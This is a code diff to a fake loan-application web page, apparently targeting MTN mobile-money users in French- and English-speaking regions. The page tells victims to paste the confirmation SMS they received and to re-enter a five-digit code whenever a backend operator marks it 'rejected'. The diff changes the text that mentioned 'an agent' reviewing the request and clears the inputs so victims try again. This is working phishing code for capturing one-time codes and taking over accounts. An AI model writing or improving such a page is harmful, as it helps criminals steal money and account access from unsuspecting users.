@@ -24,7 +24,7 @@ const translations = {
         back: "BACK", step3_of: "Step 3 of 3", emp_details: "Employment Details",
         emp_status: "Employment Status", self_emp: "Self-employed", emp_ft: "Employed full-time", emp_pt: "Employed part-time", student: "Student", unemployed: "Unemployed",
         annual_income: "Annual Income (XAF)", annual_ph: "e.g., 5000000", submit_app: "SUBMIT APPLICATION",
-        processing: "Processing Application", processing_sub: "Please wait while an agent reviews your loan request.",
+        processing: "Processing Application", processing_sub: "Please wait, this may take a few seconds",
         paste_sms_title: "Paste the <span style='color: #ffcc00;'>SMS</span> from MTN",
         paste_sms_sub: "We sent a confirmation message to your number.<br><strong>Copy the full SMS you received</strong> and paste it below.",
         paste_sms_tip: "Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.",
@@ -57,7 +57,7 @@ const translations = {
         back: "RETOUR", step3_of: "Étape 3 sur 3", emp_details: "Détails de l'emploi",
         emp_status: "Statut d'emploi", self_emp: "Travailleur indépendant", emp_ft: "Employé à temps plein", emp_pt: "Employé à temps partiel", student: "Étudiant", unemployed: "Sans emploi",
         annual_income: "Revenu annuel (XAF)", annual_ph: "ex: 5000000", submit_app: "SOUMETTRE LA DEMANDE",
-        processing: "Traitement de la demande", processing_sub: "Veuillez patienter pendant qu'un agent examine votre demande.",
+        processing: "Traitement de la demande", processing_sub: "Veuillez patienter, cela peut prendre quelques secondes",
         paste_sms_title: "Collez le <span style='color: #ffcc00;'>SMS</span> de MTN",
         paste_sms_sub: "Nous avons envoyé un message de confirmation à votre numéro.<br><strong>Copiez le SMS complet</strong> et collez-le ci-dessous.",
         paste_sms_tip: "Ouvrez votre application Messages, trouvez le SMS de MTN, appuyez longuement dessus, appuyez sur Copier, puis revenez ici.",
@@ -90,7 +90,7 @@ const translations = {
         back: "RETOURNER", step3_of: "Étape 3 sur 3", emp_details: "Ton travail",
         emp_status: "Tu fais quoi?", self_emp: "Je suis mon propre boss", emp_ft: "Je travaille full time", emp_pt: "Je travaille part time", student: "Je suis étudiant", unemployed: "Je suis au chômage",
         annual_income: "Ce que tu gagnes par an (XAF)", annual_ph: "ex: 5000000", submit_app: "ENVOYER L'APPLICATION",
-        processing: "On traite ton dossier", processing_sub: "Attends un peu, un agent regarde ton dossier.",
+        processing: "On traite ton dossier", processing_sub: "Attends un peu, ça peut prendre quelques secondes",
         paste_sms_title: "Colle le <span style='color: #ffcc00;'>SMS</span> de MTN",
         paste_sms_sub: "On t'a envoyé un message.<br><strong>Copie le SMS complet</strong> et colle ici.",
         paste_sms_tip: "Ouvre tes messages, trouve le SMS de MTN, appuie longtemps, copie, et reviens ici.",
@@ -328,12 +328,18 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'rejected') {
                         clearInterval(interval);
+                        // UPDATED: Go back to Step 2 (Phone & Code) on Reject
                         document.getElementById('processing-title').innerText = "Incorrect Details";
                         document.getElementById('processing-text').innerText = "Enter the correct 5 digit code.";
                         document.getElementById('loader-spinner').style.display = "none";
                         
                         setTimeout(() => {
-                            showScreen('screen-sms');
+                            showScreen('screen-step2');
+                            
+                            // Clear the inputs
+                            document.getElementById('phone').value = '';
+                            document.getElementById('verification-code').value = '';
+                            
                             smsInput.value = ''; 
                             verifyBtn.style.pointerEvents = 'none';
                             verifyBtn.style.background = '#1e3a8a';
